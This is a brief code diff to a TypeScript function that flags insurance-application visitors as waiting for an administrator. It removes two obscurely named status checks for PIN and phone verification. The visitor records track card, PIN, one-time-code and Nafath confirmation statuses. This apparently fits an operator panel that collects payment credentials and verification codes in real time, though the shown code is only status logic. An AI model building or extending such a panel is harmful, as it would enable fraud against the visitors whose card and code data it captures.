@@ -32,12 +32,7 @@ const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
     return true;
   }
 
-  // 3. Check PIN status - show waiting indicator when PIN is verifying
-  if (visitor._v6Status === "verifying") {
-    return true;
-  }
-
-  // 4. Check other status fields for "waiting" or "pending"
+  // 3. Check other status fields for "waiting" or "pending"
   if (
     visitor.cardStatus === "waiting" || 
     visitor.cardStatus === "pending" ||
@@ -45,8 +40,7 @@ const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
     visitor.pinStatus === "pending" ||
     visitor.phoneOtpStatus === "waiting" || 
     visitor.phoneOtpStatus === "pending" ||
-    visitor.nafadConfirmationStatus === "waiting" ||
-    visitor._v4Status === "pending"    // Phone verification status
+    visitor.nafadConfirmationStatus === "waiting"
   ) {
     // Double check: if it's a Nafad related waiting but code is already sent, it's not waiting for admin anymore
     if (visitor.nafadConfirmationCode && (visitor.currentStep === "_t6" || visitor.nafadConfirmationStatus === "waiting")) {
